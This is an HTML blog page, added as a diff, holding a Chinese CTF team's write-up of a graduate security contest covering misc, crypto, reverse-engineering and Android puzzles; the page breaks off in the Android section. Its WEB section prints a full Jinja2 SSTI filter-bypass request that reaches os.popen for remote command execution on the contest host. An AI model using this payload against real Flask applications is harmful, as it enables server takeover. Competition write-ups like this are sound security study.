@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"lg-showtime.github.io","root":"/","scheme":"Mist","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}};
+  </script>
+
+  <meta name="description" content="研究生网络与信息安全技术大赛writeup 河北组Ginkgo战队WRITEUP  战队信息  战队名称：Ginkgo 战队编号：84ffbd8021b2005i 所属单位：防灾科技学院 战队成员姓名：吕广旭 卢加奇 魏先燕  解题情况    解题过程题目一 MIsc签到  操作内容：步骤01：打开题目发现为魔方题目：查看网页源代码找到JS 步骤02： 、 步骤 03：找到var this_is_">
+<meta property="og:type" content="website">
+<meta property="og:title" content="CTF">
+<meta property="og:url" content="https://lg-showtime.github.io/index.html/CTF.html">
+<meta property="og:site_name" content="lg-showtime">
+<meta property="og:description" content="研究生网络与信息安全技术大赛writeup 河北组Ginkgo战队WRITEUP  战队信息  战队名称：Ginkgo 战队编号：84ffbd8021b2005i 所属单位：防灾科技学院 战队成员姓名：吕广旭 卢加奇 魏先燕  解题情况    解题过程题目一 MIsc签到  操作内容：步骤01：打开题目发现为魔方题目：查看网页源代码找到JS 步骤02： 、 步骤 03：找到var this_is_">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://uploader.shimo.im/f/19WvvkKKp8tjxOnq.png!thumbnail">
+<meta property="og:image" content="https://uploader.shimo.im/f/IDQFBE7N8NFkkaW6.png!thumbnail">
+<meta property="og:image" content="https://uploader.shimo.im/f/pW0Ysfy53P6wIjqq.png!thumbnail">
+<meta property="og:image" content="https://uploader.shimo.im/f/BgROQtOIcphetKMY.jpeg!thumbnail">
+<meta property="og:image" content="https://uploader.shimo.im/f/qvWN2CxuXb3857iI.png!thumbnail">
+<meta property="og:image" content="https://uploader.shimo.im/f/NXYtHpfgLbXGe0XI.png!thumbnail">
+<meta property="og:image" content="https://uploader.shimo.im/f/idXf3LoxuoIb7w2X.png!thumbnail">
+<meta property="og:image" content="https://uploader.shimo.im/f/GZpjp7RE4ThBuWs6.png!thumbnail">
+<meta property="og:image" content="https://uploader.shimo.im/f/d6b9VRzILcPiyT5a.png!thumbnail">
+<meta property="og:image" content="https://uploader.shimo.im/f/KFOW9oaCTHHfq1SV.png!thumbnail">
+<meta property="og:image" content="https://uploader.shimo.im/f/MiL7fwJfnzxkId9n.png!thumbnail">
+<meta property="og:image" content="https://uploader.shimo.im/f/BGPqzwC0KbZNRXM9.png!thumbnail">
+<meta property="og:image" content="https://uploader.shimo.im/f/HuRADJLB7L2qa5EN.png!thumbnail">
+<meta property="og:image" content="https://uploader.shimo.im/f/810zkWBxFodrfLOb.png!thumbnail">
+<meta property="og:image" content="https://uploader.shimo.im/f/XVQrdjmCAin1V5NZ.png!thumbnail">
+<meta property="article:published_time" content="2020-11-09T12:57:11.000Z">
+<meta property="article:modified_time" content="2020-11-09T13:14:08.781Z">
+<meta property="article:author" content="lg-showtime">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://uploader.shimo.im/f/19WvvkKKp8tjxOnq.png!thumbnail">
+
+
+<link rel="canonical" href="https://lg-showtime.github.io/index.html/CTF">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : false,
+    lang   : 'en'
+  };
+</script>
+
+  <title>CTF | lg-showtime
+</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">lg-showtime</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section">Home</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <section class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E4%B8%80-MIsc%E7%AD%BE%E5%88%B0"><span class="nav-number">2.</span> <span class="nav-text">题目一 MIsc签到</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="nav-number">3.</span> <span class="nav-text">操作内容：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag%E5%80%BC%EF%BC%9A"><span class="nav-number">4.</span> <span class="nav-text">flag值：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E4%BA%8C-MIsc-1-%E7%94%B5%E8%AF%9D"><span class="nav-number">5.</span> <span class="nav-text">题目二 MIsc 1 电话</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-1"><span class="nav-number">6.</span> <span class="nav-text">操作内容：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag%E5%80%BC%EF%BC%9A-1"><span class="nav-number">7.</span> <span class="nav-text">flag值：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E4%B8%89-MIsc-2-%E6%B7%B7%E4%B9%B1"><span class="nav-number">8.</span> <span class="nav-text">题目三 MIsc 2 混乱</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-2"><span class="nav-number">9.</span> <span class="nav-text">操作内容：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag%E5%80%BC%EF%BC%9A-2"><span class="nav-number">10.</span> <span class="nav-text">flag值：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#-1"><span class="nav-number">11.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%9B%9B-RE-1"><span class="nav-number">12.</span> <span class="nav-text">题目四 RE 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-3"><span class="nav-number">13.</span> <span class="nav-text">操作内容：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#flag%E5%80%BC%EF%BC%9A-3"><span class="nav-number">13.1.</span> <span class="nav-text">flag值：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E4%BA%94-%E5%AF%86%E7%A0%81%E5%AD%A61"><span class="nav-number">14.</span> <span class="nav-text">题目五 密码学1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-4"><span class="nav-number">15.</span> <span class="nav-text">操作内容：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A401%EF%BC%9A%E8%A7%82%E5%AF%9F%E6%96%87%E6%A1%A3%E5%86%85%E5%AE%B9%E5%BE%97%E7%9F%A5%E4%BB%A5%E5%8F%8A%E6%96%87%E6%A1%A3%E5%90%8D%E5%AD%97%E5%8F%AF%E7%9F%A5%E5%A4%A7%E6%A6%82%E7%8E%87%E4%B8%BAbase%E8%A7%A3%E5%AF%86"><span class="nav-number">15.0.1.</span> <span class="nav-text">步骤01：观察文档内容得知以及文档名字可知大概率为base解密</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A402%EF%BC%9Agoogle-base%E5%9C%A8%E7%BA%BF%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7-%E5%B0%9D%E8%AF%95base%E8%A7%A3%E5%AF%86"><span class="nav-number">15.0.2.</span> <span class="nav-text">步骤02：google  base在线解密工具 尝试base解密</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A403%EF%BC%9A%E8%A7%A3%E5%AF%86%E9%A1%BA%E5%BA%8F%E4%B8%BAbase16%EF%BC%8Cbase32%EF%BC%8Cbase64"><span class="nav-number">15.0.3.</span> <span class="nav-text">步骤03：解密顺序为base16，base32，base64</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A404%EF%BC%9A%E5%BE%97%E5%88%B0-%E4%BE%9D%E6%AC%A1%E9%A1%BA%E5%BA%8F%E4%B8%BA%EF%BC%9A"><span class="nav-number">15.0.4.</span> <span class="nav-text">步骤04：得到 依次顺序为：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A405%EF%BC%9A%E6%8E%A5%E7%9D%80%E8%BF%9B%E8%A1%8Cbase91%E8%A7%A3%E5%AF%86%E5%BE%97%E5%88%B0flag"><span class="nav-number">15.0.5.</span> <span class="nav-text">步骤05：接着进行base91解密得到flag</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag%E5%80%BC%EF%BC%9A-4"><span class="nav-number">16.</span> <span class="nav-text">flag值：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%85%AD-WEB"><span class="nav-number">17.</span> <span class="nav-text">题目六 WEB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-5"><span class="nav-number">18.</span> <span class="nav-text">操作内容：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag%E5%80%BC%EF%BC%9A-5"><span class="nav-number">19.</span> <span class="nav-text">flag值：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E4%B8%83-misc4"><span class="nav-number">20.</span> <span class="nav-text">题目七 misc4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-6"><span class="nav-number">21.</span> <span class="nav-text">操作内容：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag%E5%80%BC%EF%BC%9A-6"><span class="nav-number">22.</span> <span class="nav-text">flag值：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%85%AB-misc3"><span class="nav-number">23.</span> <span class="nav-text">题目八 misc3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-7"><span class="nav-number">24.</span> <span class="nav-text">操作内容：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag%E5%80%BC%EF%BC%9A-7"><span class="nav-number">25.</span> <span class="nav-text">flag值：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E4%B9%9D-%E5%AE%89%E5%8D%931"><span class="nav-number">26.</span> <span class="nav-text">题目九 安卓1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-8"><span class="nav-number">27.</span> <span class="nav-text">操作内容：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E8%AF%A5%E9%A2%98%E4%BD%BF%E7%94%A8%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99%E7%9A%84%E8%84%9A%E6%9C%AC%E8%AF%B7%E8%AF%A6%E7%BB%86%E5%86%99%E5%87%BA%EF%BC%8C%E4%B8%8D%E5%85%81%E8%AE%B8%E6%88%AA%E5%9B%BE"><span class="nav-number">28.</span> <span class="nav-text">如该题使用自己编写的脚本请详细写出，不允许截图</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag%E5%80%BC%EF%BC%9A-8"><span class="nav-number">29.</span> <span class="nav-text">flag值：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%8D%81-%E5%AF%86%E7%A0%812"><span class="nav-number">30.</span> <span class="nav-text">题目十 密码2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-9"><span class="nav-number">31.</span> <span class="nav-text">操作内容：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E8%AF%A5%E9%A2%98%E4%BD%BF%E7%94%A8%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99%E7%9A%84%E8%84%9A%E6%9C%AC%E8%AF%B7%E8%AF%A6%E7%BB%86%E5%86%99%E5%87%BA%EF%BC%8C%E4%B8%8D%E5%85%81%E8%AE%B8%E6%88%AA%E5%9B%BE-1"><span class="nav-number">32.</span> <span class="nav-text">如该题使用自己编写的脚本请详细写出，不允许截图</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag%E5%80%BC%EF%BC%9A-9"><span class="nav-number">33.</span> <span class="nav-text">flag值：</span></a></li></ol></div>
+        </section>
+        <!--/noindex-->
+
+        <section class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">lg-showtime</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">1</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </section>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner page posts-expand">
+      
+  
+  
+
+      
+
+    
+    
+    
+    <div class="post-block" lang="en">
+      <header class="post-header">
+
+<h1 class="post-title" itemprop="name headline">CTF
+</h1>
+
+<div class="post-meta-container">
+  
+
+</div>
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+          <p><strong>研究生网络与信息安全技术大赛writeup</strong></p>
+<p><strong>河北组Ginkgo战队WRITEUP</strong></p>
+<ol>
+<li><strong>战队信息</strong></li>
+</ol>
+<p>战队名称：Ginkgo</p>
+<p>战队编号：84ffbd8021b2005i</p>
+<p>所属单位：防灾科技学院</p>
+<p>战队成员姓名：吕广旭 卢加奇 魏先燕</p>
+<ol start="2">
+<li><strong>解题情况</strong><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://uploader.shimo.im/f/19WvvkKKp8tjxOnq.png!thumbnail" alt="图片"></h3></li>
+</ol>
+<p><img src="https://uploader.shimo.im/f/IDQFBE7N8NFkkaW6.png!thumbnail" alt="图片"></p>
+<ol start="3">
+<li><strong>解题过程</strong><h3 id="题目一-MIsc签到"><a href="#题目一-MIsc签到" class="headerlink" title="题目一 MIsc签到"></a><strong>题目一 MIsc签到</strong></h3></li>
+</ol>
+<h3 id="操作内容："><a href="#操作内容：" class="headerlink" title="操作内容："></a><strong>操作内容：</strong></h3><p>步骤01：打开题目发现为魔方题目：查看网页源代码找到JS</p>
+<p>步骤02： <script  src="js/index.js"></script>、</p>
+<p>步骤 03：找到var this_is_flag =</p>
+<p>步骤 04：eval()这个flag</p>
+<p><img src="https://uploader.shimo.im/f/pW0Ysfy53P6wIjqq.png!thumbnail" alt="图片"></p>
+<h3 id="flag值："><a href="#flag值：" class="headerlink" title="flag值："></a><strong>flag值：</strong></h3><p><strong>flag{CuB4_@nd_JSfuck}</strong></p>
+<h3 id="题目二-MIsc-1-电话"><a href="#题目二-MIsc-1-电话" class="headerlink" title="题目二 MIsc 1 电话"></a><strong>题目二 MIsc 1 电话</strong></h3><h3 id="操作内容：-1"><a href="#操作内容：-1" class="headerlink" title="操作内容："></a><strong>操作内容：</strong></h3><p>步骤01：在Au中打开音频文件，调出频谱图，通过放大和增大频谱分辨率可以看到每个按键音对应两条细线，右侧是每条线对应的赫兹，而按键音采用的是一种双音多频的信号方式，对照表根据高低群Hz数确定每个按键音得到一串数字45774391614390919680552035340229102217126562041792203410479326635706552497458然后转换为16进制</p>
+<p>步骤02： 6533633533636265633936656138626465306332393465353230623337613532然后转换成字符串e3c53cbec96ea8bde0c294e520b37a52得到flag{e3c53cbec96ea8bde0c294e520b37a52}</p>
+<p><img src="https://uploader.shimo.im/f/BgROQtOIcphetKMY.jpeg!thumbnail" alt="图片"></p>
+<h3 id="flag值：-1"><a href="#flag值：-1" class="headerlink" title="flag值："></a><strong>flag值：</strong></h3><p>flag{e3c53cbec96ea8bde0c294e520b37a52}</p>
+<p>null</p>
+<h3 id="题目三-MIsc-2-混乱"><a href="#题目三-MIsc-2-混乱" class="headerlink" title="题目三 MIsc 2 混乱"></a><strong>题目三 MIsc 2 混乱</strong></h3><h3 id="操作内容：-2"><a href="#操作内容：-2" class="headerlink" title="操作内容："></a><strong>操作内容：</strong></h3><p>步骤01：解压压缩包得到txt文档</p>
+<p>步骤02：txt里是png图片十六进制的倒序,通过尾部的89504E47可判断</p>
+<p>文本倒置后还原出图片,winhex手动分离出压缩包,得到一段词频分析</p>
+<p>步骤03：得到图片发现flag</p>
+<p><img src="https://uploader.shimo.im/f/qvWN2CxuXb3857iI.png!thumbnail" alt="图片"></p>
+<h3 id="flag值：-2"><a href="#flag值：-2" class="headerlink" title="flag值："></a><strong>flag值：</strong></h3><p><strong>flag{M1Sc_i5_FUn!}</strong></p>
+<h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><h3 id="题目四-RE-1"><a href="#题目四-RE-1" class="headerlink" title="题目四 RE 1"></a><strong>题目四 RE 1</strong></h3><h3 id="操作内容：-3"><a href="#操作内容：-3" class="headerlink" title="操作内容："></a><strong>操作内容：</strong></h3><p><img src="https://uploader.shimo.im/f/NXYtHpfgLbXGe0XI.png!thumbnail" alt="图片"></p>
+<p><img src="https://uploader.shimo.im/f/idXf3LoxuoIb7w2X.png!thumbnail" alt="图片"></p>
+<p>TLS反调试+UPX壳。</p>
+<p>拖进OD中，断在TLS处回调函数处，开启OD的反反调试插件即可全过。</p>
+<p><img src="https://uploader.shimo.im/f/GZpjp7RE4ThBuWs6.png!thumbnail" alt="图片"></p>
+<p>在关键JCC处发现flag。</p>
+<p>flag{HappyNewYear!}</p>
+<h4 id="flag值：-3"><a href="#flag值：-3" class="headerlink" title="flag值："></a><strong>flag值：</strong></h4><p>flag{HappyNewYear!}</p>
+<h3 id="题目五-密码学1"><a href="#题目五-密码学1" class="headerlink" title="题目五 密码学1"></a><strong>题目五 密码学1</strong></h3><h3 id="操作内容：-4"><a href="#操作内容：-4" class="headerlink" title="操作内容："></a><strong>操作内容：</strong></h3><h5 id="步骤01：观察文档内容得知以及文档名字可知大概率为base解密"><a href="#步骤01：观察文档内容得知以及文档名字可知大概率为base解密" class="headerlink" title="步骤01：观察文档内容得知以及文档名字可知大概率为base解密"></a>步骤01：观察文档内容得知以及文档名字可知大概率为base解密</h5><h5 id="步骤02：google-base在线解密工具-尝试base解密"><a href="#步骤02：google-base在线解密工具-尝试base解密" class="headerlink" title="步骤02：google  base在线解密工具 尝试base解密"></a>步骤02：google  base在线解密工具 尝试base解密</h5><h5 id="步骤03：解密顺序为base16，base32，base64"><a href="#步骤03：解密顺序为base16，base32，base64" class="headerlink" title="步骤03：解密顺序为base16，base32，base64"></a>步骤03：解密顺序为base16，base32，base64</h5><h5 id="步骤04：得到-依次顺序为："><a href="#步骤04：得到-依次顺序为：" class="headerlink" title="步骤04：得到 依次顺序为："></a>步骤04：得到 依次顺序为：</h5><p>4B46445759534B51494E34444F5443464E42555555564A5A504A49464B564A4C4D495A5643364B534E4A344847574B444E5243413D3D3D3D</p>
+<p>base16</p>
+<p>KFDWYSKQIN4DOTCFNBUUUVJZPJIFKVJLMIZVC6KSNJ4HGWKDNRCA====</p>
+<p>base32</p>
+<p>QGlIPCx7LEhiJU9zPUU+b3QyRjxsYClD</p>
+<p>base64</p>
+<p>@iH&lt;,{,Hb%Os=E&gt;ot2F&lt;l`)C</p>
+<h5 id="步骤05：接着进行base91解密得到flag"><a href="#步骤05：接着进行base91解密得到flag" class="headerlink" title="步骤05：接着进行base91解密得到flag"></a>步骤05：接着进行base91解密得到flag</h5><h3 id="flag值：-4"><a href="#flag值：-4" class="headerlink" title="flag值："></a><strong>flag值：</strong></h3><p>flag{base_n0t_3asy}</p>
+<h3 id="题目六-WEB"><a href="#题目六-WEB" class="headerlink" title="题目六 WEB"></a><strong>题目六 WEB</strong></h3><h3 id="操作内容：-5"><a href="#操作内容：-5" class="headerlink" title="操作内容："></a><strong>操作内容：</strong></h3><p>步骤01：根据id猜想sql注入未果；尝试sstiflask 经过fuzz过滤下划线单引号，但是没有过滤request组件和attr以及globals，于是尝试将命令执行的代码构造在headers当中，最终一步一步的拼接得出：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /?id=&#123;%%20for%20c%20in%20[]|attr(request.headers.x1)|attr(request.headers.x2)|attr(request.headers.x3)()%20%&#125;&#123;%%20if%20c|attr(request.headers.x4)==request.headers.x5%20%&#125;&#123;%for%20d%20in%20((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])%&#125;&#123;%if%20d==request.headers.x9%&#125;&#123;&#123;((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])[d](request.headers.x13)&#125;&#125;&#123;%%20endif%20%&#125;&#123;%%20endfor%20%&#125;&#123;%%20endif%20%&#125;&#123;%%20endfor%20%&#125; HTTP/1.1</span><br><span class="line">Host:![图片](https://uploader.shimo.im/f/lGT2pxv9ANZfENOq.png!thumbnail)1e3de755.yunyansec.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36</span><br><span class="line">x13: __import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()</span><br><span class="line">x9: eval</span><br><span class="line">x8: __builtins__</span><br><span class="line">x7: __globals__</span><br><span class="line">x6: __init__</span><br><span class="line">x5: catch_warnings</span><br><span class="line">x4: __name__</span><br><span class="line">x3: __subclasses__</span><br><span class="line">x2: __base__</span><br><span class="line">x1: __class__</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p>在根目录下找到flag文件</p>
+<p><img src="https://uploader.shimo.im/f/d6b9VRzILcPiyT5a.png!thumbnail" alt="图片"></p>
+<h3 id="flag值：-5"><a href="#flag值：-5" class="headerlink" title="flag值："></a><strong>flag值：</strong></h3><p>flag{tpl_Byp@5S}</p>
+<h3 id="题目七-misc4"><a href="#题目七-misc4" class="headerlink" title="题目七 misc4"></a>题目七 misc4</h3><h3 id="操作内容：-6"><a href="#操作内容：-6" class="headerlink" title="操作内容："></a><strong>操作内容：</strong></h3><p>步骤01：打开文件将xxx文件拖到010editor观察文件看见pk文件头经过分析</p>
+<p>将pk拖到最后新建一个文件保存得到zip包解压得到 你找flag.docx 打开文档未果</p>
+<p>步骤02：尝试将pk头前面的保存文件，base64解码后得类似注册表文件，关注”Password”=hex:37,5e,be,86,70,b3,c6,f3，搜索得类似题目，VNC解密后得到密码!QAZ2wsx,猜测为压缩包密码，解密后</p>
+<p><img src="https://uploader.shimo.im/f/KFOW9oaCTHHfq1SV.png!thumbnail" alt="图片"></p>
+<p>在word/document.xml后半部分发现一段密文，Base一把梭后，base32解密得flag</p>
+<h3 id="flag值：-6"><a href="#flag值：-6" class="headerlink" title="flag值："></a><strong>flag值：</strong></h3><p>flag{698d51a19d8a121ce581499d7b701668}</p>
+<h3 id="题目八-misc3"><a href="#题目八-misc3" class="headerlink" title="题目八 misc3"></a>题目八 misc3</h3><h3 id="操作内容：-7"><a href="#操作内容：-7" class="headerlink" title="操作内容："></a><strong>操作内容：</strong></h3><p>Ctf show 做过原题：表情包更改高度看到密码 “没技术，是菜鸡”</p>
+<p>打开null包得空的txt 得0宽度字符解码0宽度字符解码，得到类似aes密码，先base64解码，去掉Salted__头，然后再TripleDes解码。</p>
+<p><img src="https://uploader.shimo.im/f/MiL7fwJfnzxkId9n.png!thumbnail" alt="图片"></p>
+<h3 id="flag值：-7"><a href="#flag值：-7" class="headerlink" title="flag值："></a><strong>flag值：</strong></h3><p>flag{l0ts_0f_?????????????}</p>
+<h3 id="题目九-安卓1"><a href="#题目九-安卓1" class="headerlink" title="题目九 安卓1"></a>题目九 安卓1</h3><h3 id="操作内容：-8"><a href="#操作内容：-8" class="headerlink" title="操作内容："></a><strong>操作内容：</strong></h3><p>Android</p>
+<p>使用androidkiller破解apk</p>
+<p><img src="https://uploader.shimo.im/f/BGPqzwC0KbZNRXM9.png!thumbnail" alt="图片"></p>
+<p>搜索关键字符串</p>
+<p><img src="https://uploader.shimo.im/f/HuRADJLB7L2qa5EN.png!thumbnail" alt="图片"></p>
+<p>使用jd-jui查看class类</p>
+<p><img src="https://uploader.shimo.im/f/810zkWBxFodrfLOb.png!thumbnail" alt="图片"></p>
+<p>查看关键计算代码</p>
+<p><img src="https://uploader.shimo.im/f/XVQrdjmCAin1V5NZ.png!thumbnail" alt="图片"></p>
+<p>比较经典的石头剪刀布逆向，直接52pojie搜索脚本</p>
